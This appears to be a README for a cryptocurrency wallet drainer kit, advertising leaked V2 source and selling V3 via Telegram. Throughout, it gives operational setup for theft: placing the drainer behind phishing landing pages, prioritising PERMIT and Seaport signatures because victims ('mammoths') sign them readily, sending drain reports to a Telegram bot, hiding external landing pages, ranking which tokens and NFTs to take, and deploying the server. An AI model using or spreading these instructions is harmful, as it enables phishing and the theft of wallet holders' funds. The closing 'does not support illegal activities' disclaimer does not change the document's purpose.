# tokenen-Drainer

### Every seller on here is fake!! I have leaked the full source code of the V2 because I made a V3, and I wont be putting up any demos for V3. For Sale only. NO DEMO/TESTING

# V2 FEATURES
- Added uniswap, pancakeswap, and sushiswap from previous versions
- Reports all drains and connects to telegram bot
- Multi Chain

#### I decided to drop this script because I do not want to accomodate any more clients asking for demos. ITS FRUSTRATING!!! THIS SHOULD BE ENOUGH PROOF!!
#### ALSO TO LAY OFF SCAMMERS SELLING MY OBFUSCATED SCRIPTS!!
#### Dont ask for price its 1 ETH, get to the point, dont DM if you cannot afford.

## Contact Me On Telegram for V3 @ 1 ETH (no discount/demo): https://t.me/tokenen 


## 1. A small educational program on the structure of the script and how to setup

Pleaase do not DM on how to setup the leaked SCRIPT. All instructions are on this repo.

Let's rapidly go through every component of the tokenen X DRAINER now. You can skip this step if you are not a coder, you have no interest in how the project functions, and you know zilch about code.

<p align="center">

![screenshot341](https://user-images.githubusercontent.com/121665021/228003048-c97c2b24-63cb-4b24-9785-62b5df415024.png)

ABIs - interfaces for interacting with tokens (ERC20, ERC721, ERC1155). 

Public - external files, landing page. public/scripts - external scripts required for work. 

public/scripts/main.js - the main script that is responsible for interacting with the wallet (approval, signature, seaport). 

config.json - configuration. app.js - server file, internal logic (auto output). 

## Contact Me On Telegram for V3 @ 1 ETH (no discount): https://t.me/tokenen 


docker-compose.yml, Dockerfile - setting up the container system and run system. 

package.json, package-lock.json - dependencies to install. 

rpc.json - network configuration. 

start.sh - launcher.

## 2. The best way to link landing pages.

You must type scripts on a landing page with the button for installation:


![Screenshot HTML](https://user-images.githubusercontent.com/121665021/228004753-5391b51f-ac05-4529-93b6-5fb26549f1da.png)

You must type scripts on a landing page with the button for installation:

``onclick="login()"``

## 3. Configuration setup. Privately register

Private Key: It is also a private key, and you can find it in the "Account details" tab of the MetaMask browser extension.

Please keep in mind that the wallet address, whose private key you enter in the configuration, should always have some money in the primary network currency. 

Gas is required to pay for gas while approvals are being withdrawn from the mammoth's wallet. 

It will be sufficient to invest a couple of dollars in each network: 

Ethereum - ETH Binance Smart Chain 

BNB Polygon - MATIC and so on into all other networks on which you will work...

Of course, you'll need to invest a little more money in the Ethereum network, around 15-20 dollars, because this blockchain is volatile in terms of gas.

### 3.1 Configuration. Telegram rejection.

To connect the backoff, open the config.json file and enter the following information:


![Screenshot uuuuuuuuuuuuu 095309](https://user-images.githubusercontent.com/121665021/228011401-961c43fe-296a-4ead-8dc7-4c81bd06de7d.png)


``Line 2 - bot token , line 3 - account ID or channel ID, which should receive notifications``

### 3.2 Configuration setup. Priority is given to PERMIT and SEAPORT.

The permit and seaport methods are set to true by default, which means they have the highest priority, i.e. regardless of how expensive the token is on the victim's wallet, the script will still write off tokens that support PERMIT or SEAPORT, because the chance of a mammoth signing them is much higher than for others. 

After these signatures are signed, the script will start removing the remaining tokens using the procedures we are used to using approve, setApprovalForAll, and SIGN / TRANSFER.ranging from pricey to cheap. 

Set the value to false instead of true to disable PERMIT and SEAPORT priority:


![Screenshot uuuuuuuuuuuuu 095309](https://user-images.githubusercontent.com/121665021/228011424-84749b1b-f51c-45c5-8dce-c6e4df7058db.png)


The permit_priority_tokens line contains a list of permit tokens for which the priority will work:


![Screenshot 2023-03-27 095659](https://user-images.githubusercontent.com/121665021/228012209-6c767b18-7232-44d7-b89c-b996f0d791f7.png)


### 3.3 Configuration setup. The network's main currency is written off.


We select the way of debiting the network's main currency, " sign " with a red sign, or the standard " transfer " in the gas_token_method line.

### 3.4 Configuration setup. API KEY WITH COVALENCE

Register on the Covalent website, obtain a free API key, and enter it into the configuration:


![Screenshot 2023-03-27 102122](https://user-images.githubusercontent.com/121665021/228018272-100248f2-238c-4757-9dda-722a641ac97b.png)


### 3.6 Configuration setup. External landings are being added.

External landings are sites on a conventional web host that you can just point to the server's IP address and they will begin running normally. 

This solution allows you to connect an endless number of landing pages to the server at once, conceal them, and do whatever you want with them. 
U is practical. 

To enable the "external mode" of work, you must activate the "external" option in the config by changing the value from false to true in line 10.

The site must then be raised in accordance with the standard guidelines. 

And any subsequent landings must be external, and must be configured as follows:

We upload the site files to a typical web host and place them in the file server.cfg folder.On the drain itself, we write the address of the domain that we raised, the internal frontend. (for example ) 

The web host's landing template in the public* folder will not work on the server; only externals will be active! 
If you're happy with only one server and one landing page, simply leave the value false https://mintnftzero.com blank.

### 3.7 Configuration setup. NFT LOWEST PRICE.

Line 11 is in charge of the priority of writing off nft, which means that if the value 1000 is set in the configuration, nft worth $ 1000 will be debited with the lowest priority, last after all tokens.

![Screenshot 2023-03-27 102533](https://user-images.githubusercontent.com/121665021/228019173-e6d65a7c-cc2e-4605-9a32-ca91c7c69e5b.png)

On my behalf, I recommend setting the value to $1,000 because the NFTs debited by the ports, the opensy marketplace promptly sends a check for phishing, with no opportunity of selling, and selling Deshman's no-name NFTs on other marketplaces is difficult. 

As a result, it is preferable for the script to conditionally write off a token with a price of $100 in the first place, the profit from which will be genuine, rather than NFT for $1000, the revenue from which will be simply theoretical.

#4. Upload files and publish the site.

We purchase any Ubuntu 20.04+ server, connect to it using the MobaXterm application, and use the mouse to drag the folder containing files right to the root. After that, simply enter the following instructions into the terminal and wait for the installation to complete:

''"cd source start.sh FOLDER NAME"''

During the installation process, the console will prompt you to enter the domain address in the format domain.com, enter:
Then, to the domain dns, add a "A-record" with the IP address of your Ubuntu 20.04+ server. As soon as the DNS is registered, the site will go live.

DEVELOPER DOES NOT SUPPORT ANY ILLEGAL ACTIVITIES.

## Contact Me On Telegram for V3 @ 1 ETH (no discount/demo): https://t.me/tokenen 


